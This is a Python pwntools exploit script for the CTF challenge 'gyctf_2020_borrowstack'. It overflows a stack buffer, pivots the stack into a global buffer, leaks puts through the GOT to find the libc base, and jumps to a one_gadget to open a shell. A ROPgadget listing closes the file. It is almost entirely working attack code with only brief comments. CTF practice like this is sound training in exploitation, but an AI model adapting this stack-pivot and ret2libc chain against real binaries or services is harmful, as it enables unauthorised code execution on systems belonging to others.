from pwn import *
context(log_level='debug',os='linux',arch='amd64',terminal=['tmux','splitw','-h'])

io=process("./gyctf_2020_borrowstack")
# io=remote("node4.buuoj.cn",29146)
elf=ELF("./gyctf_2020_borrowstack")
libc=ELF("./libc-2.23.so")

puts_plt=elf.plt[b"puts"]
puts_got=elf.got[b"puts"]
start_addr=elf.sym[b"main"]  #不能返回_start
pop_rdi_ret=0x400703
bank_addr=0x601080
leave_ret=0x400699
ret_addr=0x4004c9

io.recvuntil(b"want\n")
payload=cyclic(0x60)+p64(bank_addr)+p64(leave_ret)
io.send(payload)   #只能send不能sendline

gdb.attach(io)
pause()

io.recvuntil(b"now!\n")
payload=p64(ret_addr)*0x14+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(start_addr)
io.sendline(payload)

leak_addr=u64(io.recvuntil(b"\x7f").ljust(8,b"\x00"))
print("leak_addr  "+hex(leak_addr))

base_addr=leak_addr-libc.sym[b"puts"]
print("base_addr  "+hex(base_addr))

one_gadget=base_addr+0xf1147
# sys_addr=base_addr+libc.sym[b"system"]   
# bin_addr=base_addr+next(libc.search(b"/bin/sh"))
# payload=cyclic(0x68)+p64(pop_rdi_ret)+p64(bin_addr)+p64(sys_addr)   #不能调用system("/bin/sh"),需要one_gadget

io.recv()
payload=cyclic(0x68)+p64(one_gadget)
io.send(payload)

io.interactive()

# Gadgets information
# ============================================================
# 0x0000000000400699 : leave ; ret
# 0x00000000004006fc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004006fe : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400700 : pop r14 ; pop r15 ; ret
# 0x0000000000400702 : pop r15 ; ret
# 0x00000000004006fb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004006ff : pop rbp ; pop r14 ; pop r15 ; ret
# 0x0000000000400590 : pop rbp ; ret
# 0x0000000000400703 : pop rdi ; ret
# 0x0000000000400701 : pop rsi ; pop r15 ; ret
# 0x00000000004006fd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004004c9 : ret

# Unique gadgets found: 12